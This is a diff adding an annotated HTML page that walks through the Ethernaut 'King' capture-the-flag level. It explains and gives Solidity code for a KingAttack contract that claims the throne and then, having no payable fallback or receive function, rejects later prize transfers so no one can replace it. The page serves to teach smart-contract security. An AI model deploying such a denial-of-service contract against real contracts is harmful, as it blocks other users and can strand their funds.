@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+  <title>Ethernaut 9: King</title>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <link rel="stylesheet" media="all" href="../public/stylesheets/normalize.css" />
+  <link rel="stylesheet" media="all" href="../docco.css" />
+</head>
+<body>
+  <div class="container">
+    <div class="page">
+
+      <div class="header">
+        <h1>Ethernaut 9: King</h1>
+
+        
+      </div>
+      
+        
+        <p>We can keep anyone from becoming king after us by rejecting the transfer of the prize
+money, thereby interrupting execution before <code>king</code> is set. This is achieved by making
+a contract king which does not have a payable <code>fallback</code> or <code>receive</code> function.</p>
+
+        <div class='highlight'><pre><span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.6.0;</span>
+
+<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">KingAttack</span> </span>{
+    <span class="hljs-function"><span class="hljs-keyword">constructor</span> (<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">payable</span></span> <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{}</pre></div>
+      
+        
+        <p>By sending a sufficient amount (<code>&gt;= prize</code>) of ether, we become king. Our test
+queries the <code>King</code> instance for the current value of <code>prize</code> before deploying this
+contract with the ether needed.</p>
+
+        <div class='highlight'><pre>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sendEtherTo</span> (<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">payable</span> target</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
+        target.<span class="hljs-built_in">call</span>.<span class="hljs-built_in">value</span>(<span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span>)(<span class="hljs-string">&quot;&quot;</span>);
+    }
+}</pre></div>
+      
+    </div>
+  </div>
+</body>
+</html>
